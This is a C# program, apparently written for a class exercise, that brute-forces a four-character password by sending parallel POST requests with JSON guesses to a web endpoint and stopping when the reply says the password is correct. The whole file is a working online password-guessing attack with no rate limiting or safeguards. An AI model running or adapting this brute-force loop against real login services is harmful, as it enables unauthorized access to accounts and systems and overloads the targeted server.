using System.Text;
using System.Text.Json;

class Program
{
    static async Task Main(string[] args)
    {
        var httpClient = new HttpClient();
        string url = "https://fiapnet.azurewebsites.net/fiap";
        string grupo = "12"; 

        char[] capital_letters  = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        char[] lowercase_letters = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        char[] numbers = "0123456789".ToCharArray();

        // Parallel.For to try different password combinations in parallel
        Parallel.For(0, capital_letters.Length, (i, state) =>
        {
            for (int j = 0; j < lowercase_letters.Length; j++)
            {
                for (int k = 0; k < numbers.Length; k++)
                {
                    for (int l = 0; l < numbers.Length; l++)
                    {
                        string password = $"{capital_letters[i]}{lowercase_letters[j]}{numbers[k]}{numbers[l]}";
                        var response = TryPassword(httpClient, url, grupo, password).Result;

                        if (response)
                        {
                            Console.WriteLine($"Password found: {password}");
                            state.Stop();  // for all threads
                            return;
                        }
                    }
                }
            }
        });

        httpClient.Dispose();
        Console.WriteLine("Process finished.");
    }

    static async Task<bool> TryPassword(HttpClient httpClient, string url, string grupo, string password)
    {
        var data = new { Key = password, grupo };

        var jsonContent = new StringContent(JsonSerializer.Serialize(data), Encoding.UTF8, "application/json");

        try
        {
            var response = await httpClient.PostAsync(url, jsonContent);
            if (response.IsSuccessStatusCode)
            {
                // Here you can check if the password was correct depending on the expected answer
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"Password {password} - {response.StatusCode} {responseBody}");
                return responseBody.Contains("Correct password");  // Adjust according to the correct answer
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error when trying password {password}: {ex.Message}");
        }

        return false;
    }
}
